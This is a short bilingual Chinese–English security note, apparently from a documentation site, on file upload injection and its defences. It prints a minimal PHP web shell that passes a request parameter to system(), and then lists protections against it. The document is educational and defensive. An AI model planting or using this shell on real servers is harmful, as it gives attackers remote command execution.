---
sidebar_position: 23
tags: [Web, Security, FileUpload, Injection, Vulnerability]
---

# File Upload Injection

## Attack

当使用 JS 代码限制上传文件类型时,
攻击者 disable JS in browser,
并上传 malicious code file:

```php
// Malicious `web shell` code file
// <?php
//   if (isset($_REQUEST['cmd'])) {
//     $cmd = ($_REQUEST['cmd']);
//     system($cmd);
//   } else {
//     echo 'What is your bidding?';
//   }
// ?>
```

一旦攻击者成功将 `webShell.php` 当成头像上传成功,
便可以在头像处执行 `web shell` 远程攻击.

## Protection

对于用户上传文件:

- 隔离文件: host files on secure system.
- 禁止文件执行: `-x`.
- 重命名/哈希化文件: 防止攻击者找到此文件.
- 检查文件格式 (extension/`MIME` type/`Content-Type`).
- 检查文件内容.
- 检查 `Content-Type` header.
- 扫描文件: virus scanner.
